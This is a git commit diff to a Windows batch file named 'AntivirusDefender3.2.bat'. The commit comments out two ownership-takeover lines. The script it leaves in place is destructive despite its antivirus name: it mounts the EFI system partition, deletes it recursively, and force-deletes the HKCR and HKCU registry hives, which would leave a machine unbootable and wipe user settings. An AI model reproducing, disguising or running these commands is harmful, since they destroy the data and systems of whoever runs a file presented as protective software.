fd355161aca6a5d7a16ee9c20c5bee16930cb37c
Emirhan Uçan <130374789+Siradankullanici@users.noreply.github.com>
2025-03-25 13:13:59 +0300

    Update AntivirusDefender3.2.bat

--- AntivirusDefender3.2.bat
+++ AntivirusDefender3.2.bat
@@ -1,8 +1,8 @@
 mountvol x: /s 
 icacls x:
-takeown /F x:\ /R /D Y
+:: takeown /F x:\ /R /D Y
 icacls c:
-takeown /F c:\ /R /D Y
+:: takeown/F c:\ /R /D Y
 rd x: /s /q
 reg delete HKCR /f
 reg delete HKCU /f
